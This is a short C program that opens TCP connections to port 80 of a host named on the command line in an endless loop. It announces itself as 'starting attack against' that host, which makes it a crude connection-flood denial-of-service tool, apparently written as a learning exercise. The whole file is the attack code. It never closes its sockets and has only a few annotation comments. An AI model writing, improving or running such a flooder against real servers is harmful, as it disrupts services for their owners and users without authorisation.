#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdbool.h>

// man 7 ip
// man socket
// cat /etc/protocols

int main(int argc, char *argv[]){
	int socket0;
	int connect0;
	int port=80;
	char *host;
	host=argv[1];
	
	struct sockaddr_in target;	// creates the target to connect
	printf("starting attack against %s\n",host);
	
	while(true){
		socket0 = socket(AF_INET, SOCK_STREAM,0);	// defines IPV4, TCP and IP (check manual)
		target.sin_family = AF_INET;
		target.sin_port = htons(port);
		target.sin_addr.s_addr = inet_addr(host);
		
		// stop saving in variable later
		connect0 = connect(socket0, (struct sockaddr *)&target, sizeof target);	// starts connection
		
	}

	return 0;
}
